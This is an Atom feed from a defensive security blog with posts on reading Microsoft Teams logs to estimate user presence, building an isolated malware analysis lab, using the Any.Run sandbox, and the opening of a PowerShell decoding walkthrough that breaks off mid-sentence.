<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-03-11T17:38:44-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Network Security Ninja</title><subtitle>A blog to post my Tactics, Techniques, and Procedures (TTPs) as a card-carrying member of the Blue Team (Cyber Defense). </subtitle><author><name>Jeremiah Bess</name></author><entry><title type="html">Microsoft Teams Logs for Activity</title><link href="http://localhost:4000/analysis/2021/02/11/ms-teams-logs-activity.html" rel="alternate" type="text/html" title="Microsoft Teams Logs for Activity" /><published>2021-02-11T00:00:00-07:00</published><updated>2021-02-11T00:00:00-07:00</updated><id>http://localhost:4000/analysis/2021/02/11/ms-teams-logs-activity</id><content type="html" xml:base="http://localhost:4000/analysis/2021/02/11/ms-teams-logs-activity.html">&lt;p&gt;Occasionally, my office is tasked with validating users at-computer activity or lack thereof in response to a security incident, manager suspicions, or possible timecard fraud. Short of having spyware installed on endpoints, we have to look to available logs to help identify when a user was or was not at their computer. In looking for options, I noted a very verbose set of events in the Microsoft Teams logs that can help us in these taskings.&lt;/p&gt;

&lt;h1 id=&quot;log-location-and-retention&quot;&gt;Log location and retention&lt;/h1&gt;

&lt;p&gt;I found that by default, the teams logs are located in &lt;em&gt;C:\Users\&amp;lt;PROFILE&amp;gt;\AppData\Roaming\Microsoft\Teams&lt;/em&gt;. They consist of &lt;em&gt;logs.txt&lt;/em&gt;, and several rollovers named &lt;em&gt;old_logs_&amp;lt;DATESTAMP&amp;gt;.txt&lt;/em&gt;. The DATESTAMP is in the format of 4 digit year, 2 digit month, 2 digit day, and finally the local hour, minute, and second of the log rollover. It is unknown what triggers the rollover, as log sizes are very different and each log can contain various counts of days of data. Given that the first line in some rollover logs seems to be cut-off from the previous log file, it’s clear the rollover is done on-the-fly with Teams still in operation.&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;old_logs_20210122070635.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The combination of these logs gives you 30 days of information. It is unclear if this retention can be increased by Teams application administrators.&lt;/p&gt;

&lt;h1 id=&quot;log-syntax&quot;&gt;Log syntax&lt;/h1&gt;

&lt;p&gt;Each event is prefaced by a datetime stamp in local time for the machine. It’s followed by the PID of the Teams instance inside angle brackets. A log type (info, error, etc) is surrounded by double-dashes, followed by the event.&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wed Jan 20 2021 13:20:53 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- info -- StatusIndicatorStateService: Added Away (current state: NewActivity -&amp;gt; NewActivity)&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;event-types&quot;&gt;Event types&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Teams app startup&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There are a ton of lines generated on start up that could be used. However, I chose to use this one below as it’s short and pretty clear what is happening:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fri Jan 22 2021 07:06:50 GMT-0700 (Mountain Standard Time) &amp;lt;16588&amp;gt; -- info -- StatusIndicatorStateService: initialized&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Teams app shutdown&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If Teams is quit properly by the user, this is the log message you can expect:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fri Jan 15 2021 15:00:34 GMT-0700 (Mountain Standard Time) &amp;lt;16308&amp;gt; -- info -- session-end fired&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Teams app killed&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If Teams crashes or is killed (possibly to install patches?), you will get a different kind of message:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thu Jan 21 2021 15:01:51 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- error -- Child process gone: {&quot;type&quot;:&quot;Utility&quot;,&quot;reason&quot;:&quot;killed&quot;,&quot;exitCode&quot;:1073807364,&quot;name&quot;:&quot;Network Service&quot;}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Machine is locked manually&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If the user locks the machine manually, you will find just this simple message:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fri Jan 22 2021 12:30:11 GMT-0700 (Mountain Standard Time) &amp;lt;16588&amp;gt; -- info -- Machine is locked&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Machine is locked by timeout&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;However, if the machine is locked due to an inactivity timeout (whatever your GPO/local settings are), you can expect a message indicating how long the machine was idle, followed by the locked message:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wed Jan 20 2021 12:30:21 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- info -- Machine has been idle for 1198.438 seconds&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wed Jan 20 2021 12:31:23 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- info -- Machine is locked&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;I did find that the auto-locking of a machine due to inactivity was not consistent. My company policy is 30 minutes, however, I saw a +/- 5 minute variation in when the machine was actually locked.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Machine is unlocked&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The machine being unlocked is pretty self-explainatory:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fri Jan 22 2021 12:30:18 GMT-0700 (Mountain Standard Time) &amp;lt;16588&amp;gt; -- info -- Machine is unlocked&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Machine is suspended&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If a user shuts the laptop lid or otherwise suspends the machine, you can expect these messages in succession:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mon Jan 18 2021 06:58:43 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- info -- Machine is locked&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mon Jan 18 2021 06:58:44 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- info -- System has been suspended&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Away&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Teams indicates when a user is away by changing the icon to a yellow clock. This is also indicated in the logs with the following:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wed Jan 20 2021 13:20:49 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- info -- Machine has been idle for 300.11 seconds&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wed Jan 20 2021 13:20:53 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- info -- userStatusChanged received, so presence is known; and upsEnabledKnown=true&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wed Jan 20 2021 13:20:53 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- info -- StatusIndicatorStateService: Added Away (current state: NewActivity -&amp;gt; NewActivity)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Available&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Finally, to indicated when a user is available, the icon is a green checkmark. This is indicated in the logs with the following:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wed Jan 20 2021 13:23:22 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- event -- eventData: s::;m::1;a::4, inactiveTime: 150.437, name: machineState, ppChannel: Production::DC, distSrc: PROPLUS_O365ProPlusRetail, ppInstallMode: UPDATEONLYAPPLY, autoStartPolicy: undefined, vdiMode: 0, eventpdclevel: 2,&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wed Jan 20 2021 13:23:23 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- info -- userStatusChanged received, so presence is known; and upsEnabledKnown=true&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wed Jan 20 2021 13:23:23 GMT-0700 (Mountain Standard Time) &amp;lt;16408&amp;gt; -- info -- StatusIndicatorStateService: Added Available (current state: NewActivity -&amp;gt; NewActivity)&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;parsing-the-logs&quot;&gt;Parsing the logs&lt;/h1&gt;

&lt;p&gt;All these logs are great, but it’s not easy to summarize the data with just log entries. To assist with this, I created a Teams Activity tool with python to parse the logs, and provide three different outputs. The tool is located &lt;a href=&quot;https://github.com/netsecninja/teams-activity&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The Event output shows the datetime stamps of when Teams was started/stopped/killed, when the computer was locked by the user or inactivity, and when it was unlocked.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/Teams-Event_log.png&quot; alt=&quot;Event Output&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The Activity output shows the datetime stamp and the count of hours of when a user was active at their computer.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/Teams-Activity_log.png&quot; alt=&quot;Activity Output&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The Daily output shows the sum of the active hours for each day.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/Teams-Daily_log.png&quot; alt=&quot;Daily Output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Please note that the times displayed and calculated are only best estimates given the data available.&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;summary&quot;&gt;Summary&lt;/h1&gt;

&lt;p&gt;As you can see, there are some valuable log entries found in the Teams logs. While these were the most notable events found for my use case, there may be others that could provide benefit to your own DFIR investigation and use cases. I would recommend looking into your own Teams logs and seeing what else is available and useful.&lt;/p&gt;</content><author><name>Jeremiah Bess</name></author><category term="Analysis" /><summary type="html">Occasionally, my office is tasked with validating users at-computer activity or lack thereof in response to a security incident, manager suspicions, or possible timecard fraud. Short of having spyware installed on endpoints, we have to look to available logs to help identify when a user was or was not at their computer. In looking for options, I noted a very verbose set of events in the Microsoft Teams logs that can help us in these taskings.</summary></entry><entry><title type="html">Building a Malware Analysis Lab</title><link href="http://localhost:4000/how-to/2019/08/20/building-a-malware-analysis-lab.html" rel="alternate" type="text/html" title="Building a Malware Analysis Lab" /><published>2019-08-20T00:00:00-06:00</published><updated>2019-08-20T00:00:00-06:00</updated><id>http://localhost:4000/how-to/2019/08/20/building-a-malware-analysis-lab</id><content type="html" xml:base="http://localhost:4000/how-to/2019/08/20/building-a-malware-analysis-lab.html">&lt;p&gt;There are a wide variety of methods and tools to use in a malware analysis lab, depending on what you want to be able to do. I’d like to share how I’ve created mine and explain some of the features. My lab is used for some basic static analysis and well-rounded dynamic analysis, while leveraging the power of Virtual Machines (VM). I have used this setup on my daily driver laptop, a stand-alone Out-Of-Band laptop for work, and a dedicated VM server I have at home.&lt;/p&gt;

&lt;p&gt;My lab has a Windows 10 victim VM with some basic security and analysis tools installed. I also have a Linux-based network gateway which all traffic from my victim machine will route through. The gateway has iptables rules in place to prevent the victim from accessing the rest of my home network. While this isn’t as secure as physical separation, it works for me and I accept the risks. I have tools and scripts installed that allow me to monitor/capture network traffic, including SSL decryption, as well as simulated internet services if I need to analyze targeted malware or wish to prevent attackers from knowing the malware is being analyzed. The step-by-step directions for how I set up my lab can be found on this &lt;a href=&quot;/malware-lab&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/malware-lab.png&quot; alt=&quot;My Lab&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;hypervisor&quot;&gt;Hypervisor&lt;/h1&gt;
&lt;p&gt;I choose to use VirtualBox, as it’s free and has all the features I enjoy and use. Using VMs means I can create snapshots before malware analysis, and revert once I’ve collected the data I need. The drag-and-drop and shared clipboard feature makes it easy to transfer data to and from the VMs if needed, and you can also set unidirectional transfer if you are worried. In this set up, I use NAT networking for the gateway’s external NIC, and Internal networking for the victim and gateway lab NICs. While there is always the possibility for a VM escape from more advanced malware, I have yet to see this in the wild from samples I’ve analyzed. If you are worried about that, you can always use a stand-alone box dedicated to your lab.&lt;/p&gt;

&lt;h1 id=&quot;windows-10-victim&quot;&gt;Windows 10 Victim&lt;/h1&gt;
&lt;p&gt;At the heart of my lab is my Windows 10 VM. Microsoft provides the ISO download for free and does not require activation, given you are willing to accept a few caveats like a watermark on the screen and limited personalization options. In my opinion, this is perfect for a lab VM! Of course you can use an activation key if you have one, or there is a great article on &lt;a href=&quot;https://www.tomshardware.com/reviews/get-windows-10-free-or-cheap,5717.html&quot;&gt;Tom’s Hardware&lt;/a&gt; on cheap purchasing options.&lt;/p&gt;

&lt;p&gt;In my setup, I’ve disabled automatic updates and Windows Defender. On top of this OS, I’ve installed several tools that allow me to do static and dynamic analysis:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;7-Zip - The swiss army knife for compressed files&lt;/li&gt;
  &lt;li&gt;Python - Because who doesn’t love scripting, and it’s required for the next tool&lt;/li&gt;
  &lt;li&gt;OLETools - Used for static Microsoft Office document analysis&lt;/li&gt;
  &lt;li&gt;LibreOffice - I’m too cheap to buy MS Office, but sometimes you just need to open a document to look at it. Any macro analysis is done through OLETools.&lt;/li&gt;
  &lt;li&gt;Notepad++ - Best editor out there, great for all sorts of analysis tricks&lt;/li&gt;
  &lt;li&gt;Sysmon - Improved logging of Windows events, process creation, network connections, filesystem activity, etc&lt;/li&gt;
  &lt;li&gt;Wireshark - De facto standard tool for packet capture and analysis&lt;/li&gt;
  &lt;li&gt;Procmon - A powerful process monitoring tool logging process actions including file and registry changes&lt;/li&gt;
  &lt;li&gt;ProcDOT - A third party app that combines Wireshark capture data and Procmon output to create a graphical process map&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;linux-mint-gateway&quot;&gt;Linux Mint Gateway&lt;/h1&gt;
&lt;p&gt;Protecting my home network (or whoever’s network I’m on) from any possible worming malware or lateral movement, I have a Linux Mint VM. This serves as the firewall/router for the victim, while allowing additional external tools for better network context and capturing IOCs. On this install I also have 7-Zip, Python, and OLETools, because sometimes Linux is just better at somethings, and maybe I only need to spin up one VM for a quick analysis. Yes, you could enable the Linux Subsystem in Windows, but that feels like sacrilege.&lt;/p&gt;

&lt;p&gt;Here’s the additional tools I have installed:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Polar Proxy - SSL decryption proxy, since most malware payloads/C2 are done over SSL connections&lt;/li&gt;
  &lt;li&gt;Wireshark - Needed to review packet captures from Polar Proxy&lt;/li&gt;
  &lt;li&gt;InetSim - Simulated internet services, without any real internet connections&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While you could use a Debian install and skip the desktop environment, having the ability to use Wireshark over a commandline-focused tcpdump is a huge improvement, and also makes drag-and-drop from your host machine the best way to transfer files if needed.&lt;/p&gt;

&lt;p&gt;I use iptables to limit what the victim VM can connect to, specifically rejecting any traffic to any internal non-routable IPs except my lab subnet. The iptables are also used to forward traffic to either the internet or Polar proxy, and can be cleared out if InetSim is used. I created a labnet.sh script to swap out the ipfilter rules to allow the victim machine direct access to the internet, SSL decrypted traffic, or simulated internet. If you are worried about your internal network, you can always put your lab on the DMZ if your router has that option, or use a hotspot.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;In the end, I’ve created this setup for the type of malware analysis that I do. You can certainly add or swap out any of the tools for the type of work you need. I have a &lt;a href=&quot;/malware-lab&quot;&gt;page&lt;/a&gt; set up with the step-by-step instructions of how I set up my lab, as well as links to the labnet script and iptables profiles. The beauty of this set up is I can make clones of the Win10 box, and/or put a Kali attack VM along side. I hope this post explained the hows and whys of my lab set up, highlighted some of it’s useful features, and gave you some ideas of what you can do with a lab of your own.&lt;/p&gt;</content><author><name>Jeremiah Bess</name></author><category term="How-to" /><summary type="html">There are a wide variety of methods and tools to use in a malware analysis lab, depending on what you want to be able to do. I’d like to share how I’ve created mine and explain some of the features. My lab is used for some basic static analysis and well-rounded dynamic analysis, while leveraging the power of Virtual Machines (VM). I have used this setup on my daily driver laptop, a stand-alone Out-Of-Band laptop for work, and a dedicated VM server I have at home.</summary></entry><entry><title type="html">How I use Any.Run</title><link href="http://localhost:4000/how-to/2019/04/01/how-I-use-any.run.html" rel="alternate" type="text/html" title="How I use Any.Run" /><published>2019-04-01T00:00:00-06:00</published><updated>2019-04-01T00:00:00-06:00</updated><id>http://localhost:4000/how-to/2019/04/01/how-I-use-any.run</id><content type="html" xml:base="http://localhost:4000/how-to/2019/04/01/how-I-use-any.run.html">&lt;p&gt;&lt;a href=&quot;https://app.any.run&quot;&gt;Any.Run&lt;/a&gt; is a relatively new online sandbox analysis application that is used to run suspicious executables or visit websites, and records system and network level activity. The creators of this service have provided a free version with tons of great features available. There is a subscription service to unlock even more features, however for my purposes the free version works just fine. In this post I will share the two different ways I use this powerful tool.&lt;/p&gt;

&lt;h2 id=&quot;research&quot;&gt;Research&lt;/h2&gt;

&lt;p&gt;The first way to use Any.Run is for research of threats using the public tasks others have run. In the free version of the tool, all submission results are publicly available. This makes Any.Run a very valuable tool for Open Source Intelligence (OSINT). I use these public submissions to identify malware, extract Indicators of Compromise (IOC) and Behaviors of Compromise (BOC), and to identify threat trends. From the homepage click on the icon that looks like a page with a dog eared corner to view the public submissions. This list is updated in real-time as people submit samples for analysis. Use the filter icon to the right of the hash search bar to narrow down your search.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/any.run-filters.png&quot; alt=&quot;Any.Run public submissions filters&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For example, if I see a suspicious domain while monitoring or hunting, I can use the filter criteria above to look for existing public samples. Or if I’m interested in specific malware like Ursnif, that can be found by putting its name in the tags. However if I am just looking for a general perspective of the threat landscape, I will set the verdict to malicious and start scrolling through the samples from the last day or two. I will look for threat tags I’m interested in researching and open those in the different browser tab. I like to pull up three to four samples of the same threat family as to get a better idea of any variations.&lt;/p&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;

&lt;p&gt;The second way to use Any.Run is for analysis. If you are unable to find an existing sample, you can submit a URL or file for analysis. Once you create a free account, click on New Task. There is a basic mode which you choose your OS and then either provide a URL or upload a file to be run. An advanced screen is available if you want to make any tweaks such as UAC auto-confirm, Anti-evasion, Browser types, and Fakenet or Tor usage. Greyed out options require a subscription.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/any.run-advanced-mode.png&quot; alt=&quot;Any.Run advanced mode&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once everything is set, click Run. You will then watch a real-time execution of your malware or visit to whatever URL you entered. The session will end by displaying the results of the task. The URL listed in your browser bar can now be saved in your investigation notes as a reference or shared out with others. It’s important to note that in the free version all tasks run are public tasks, which means everyone else can see the results. &lt;strong&gt;So don’t run any malware or visit any websites you think might be targeting to your organization or might otherwise reveal sensitive information.&lt;/strong&gt; You also need to be careful of two things: session timeout and user required actions.&lt;/p&gt;

&lt;h4 id=&quot;session-timeout&quot;&gt;Session Timeout&lt;/h4&gt;

&lt;p&gt;Any.Run by default will only run the virtual machine for 60 seconds. While the analysis is running you may click Add 60s in the top right box to add an additional 60 seconds. You will only have a few times you can extend the time with the free version. This is important as sometime downloads take a while, or malware authors build in a delay to evade automated sandbox analysis engines. Another reason you may want to add time is because you need to perform user actions.&lt;/p&gt;

&lt;h4 id=&quot;user-required-actions&quot;&gt;User Required Actions&lt;/h4&gt;

&lt;p&gt;Occasionally the malware or website you are attempting to analyze will require you to perform some actions. Your mouse and keyboard can be used in the VM displayed. For instance, an unzipped file might have several files inside, and you will need to choose which to run. Or a credential phishing site may request your (hopefully) fake credentials to proceed past the login screen. Be aware of these types of actions, and be ready to extend the session time if needed.&lt;/p&gt;

&lt;h2 id=&quot;analysis-results&quot;&gt;Analysis Results&lt;/h2&gt;

&lt;p&gt;Regardless if you found an existing sample or created your own, you now have a ton of information at your fingertips. While I won’t touch on every aspect of the Any.Run result interface, I will explain the parts I use regularly.&lt;/p&gt;

&lt;h4 id=&quot;info-block&quot;&gt;Info block&lt;/h4&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/any.run-info-block.png&quot; alt=&quot;Any.Run Info block&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Sample source, the environment conditions it was run in, and the detected threat tags.&lt;/li&gt;
  &lt;li&gt;IOC to list all relevant captured IOCs.&lt;/li&gt;
  &lt;li&gt;Option to download the sample.&lt;/li&gt;
  &lt;li&gt;A Process graph to show the parent-child relationship of processes observed. Within this display you may click on any item to get further information about it.&lt;/li&gt;
  &lt;li&gt;The ATT&amp;amp;CK matrix shows the techniques observed in the sample.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;process&quot;&gt;Process&lt;/h4&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/any.run-process-and-details.png&quot; alt=&quot;Any.Run Processes and details&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The relevant processes are listed with the full command line as parent processes with nested children processes. Icons displayed under the Process ID show behaviors such as network communications, executables launched, etc.&lt;/li&gt;
  &lt;li&gt;Clicking on any of these entries shows a detail pane at the bottom with additional information, warnings, and dangers.&lt;/li&gt;
  &lt;li&gt;The “More Info” advanced detail screen shows the full command line, as well as system-level actions by this process such as modified files, registry changes, network traffic, etc. For example clicking on a PowerShell process and then “More Info” might show the Base64 encoded command called, which I demonstrated how to decode in my previous &lt;a href=&quot;/analysis/2019/03/16/deeper-analysis-through-powershell-decoding.html&quot;&gt;blog post&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;network&quot;&gt;Network&lt;/h4&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/any.run-network-section.png&quot; alt=&quot;Any.Run Processes and details&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HTTP Requests will show the HTTP result code, the calling process, the full URL, document type, and a few other things. Clicking on one of the entries will show hashes, Exchangeable Image File (EXIF) information, Hex data, as well as a link to download the resulting data.&lt;/li&gt;
  &lt;li&gt;Connections shows the connection by protocol, calling process, Domain/IP/ASN info, port, and traffic bytes in each direction. Clicking on one of the entries displays a Hex dump of the packet data of the network session. Here we can see things like HTTP request and response headers, and payload data.&lt;/li&gt;
  &lt;li&gt;DNS Requests show the query and responses.&lt;/li&gt;
  &lt;li&gt;Threats will output the alerts fired from a Suricata IDS instance with associated alert details.&lt;/li&gt;
  &lt;li&gt;The PCAP icon on the far right allows you to download a packet capture of the sample.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;files&quot;&gt;Files&lt;/h4&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/any.run-files-section.png&quot; alt=&quot;Any.Run Processes and details&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;File Modification shows the process, the full path and filename, and file type of any file created or modified.&lt;/li&gt;
  &lt;li&gt;Clicking on any of these entries will details of the file including the hash, MIME type, a preview of the contents, and even the option to download a copy.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;I use this tool daily for analysis and threat research to help build my threat hunting queries and awareness of the ever-changing threat landscape. I realize this blog post really only scratched the surface. Ultimately Any.Run has quite an intuitive interface, and I hope I have highlighted enough of the extremely useful features to encourage you to try it out.&lt;/p&gt;</content><author><name>Jeremiah Bess</name></author><category term="How-to" /><summary type="html">Any.Run is a relatively new online sandbox analysis application that is used to run suspicious executables or visit websites, and records system and network level activity. The creators of this service have provided a free version with tons of great features available. There is a subscription service to unlock even more features, however for my purposes the free version works just fine. In this post I will share the two different ways I use this powerful tool.</summary></entry><entry><title type="html">Deeper analysis through PowerShell decoding</title><link href="http://localhost:4000/analysis/2019/03/16/deeper-analysis-through-powershell-decoding.html" rel="alternate" type="text/html" title="Deeper analysis through PowerShell decoding" /><published>2019-03-16T00:00:00-06:00</published><updated>2019-03-16T00:00:00-06:00</updated><id>http://localhost:4000/analysis/2019/03/16/deeper-analysis-through-powershell-decoding</id><content type="html" xml:base="http://localhost:4000/analysis/2019/03/16/deeper-analysis-through-powershell-decoding.html">&lt;p&gt;Often times malware analysis is considered complete when you run the badness in a sandboxed VM and gather the network IOCs observed. However, we can gain a better list of indicators by spending a little extra time on our analysis, as I hope this post will demonstrate as I walk through some simple PowerShell decoding.&lt;/p&gt;

&lt;h1 id=&quot;basic-analysis&quot;&gt;Basic Analysis&lt;/h1&gt;

&lt;p&gt;A co-worker shared an unknown &lt;a href=&quot;https://app.any.run/tasks/4c15f487-9f74-4e72-9ad6-540dc32c6148&quot;&gt;malware sample&lt;/a&gt; from my favorite site, Any.run, and asked if I could help him decode it and determine the malware. From the processes on Any.run we can see that a Word Document is run, followed by some PowerShell actions. We also see in the network connections PowerShell called out to 2 suspicious domains.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/anyrun-processes.png&quot; alt=&quot;Any.run process list&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/anyrun-connections.png&quot; alt=&quot;Any.run connections list&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This gives us some indicators we can run with:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Word Doc file hash and name&lt;/li&gt;
  &lt;li&gt;Two suspicious domains/IPs contacted over port 443&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Just like if we ran this in our own malware analysis VM, this is about where many Analysts would stop. However, there is so much more to learn here, but for the purposes of this post let’s focus on what PowerShell is doing.&lt;/p&gt;

&lt;h1 id=&quot;base64-decoding&quot;&gt;Base64 Decoding&lt;/h1&gt;

&lt;p&gt;Within Any.run clicking on PowerShell under Processes, then More Info below will show the commands being run. In this case, it’s a Base64 encoded PowerShell command.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/assets/anyrun-commandline.png&quot; alt=&quot;Any.run more info&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is simple enough to decode using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &amp;lt;baseb4&amp;gt; | base64 -d&lt;/code&gt; in Linux, or &lt;a 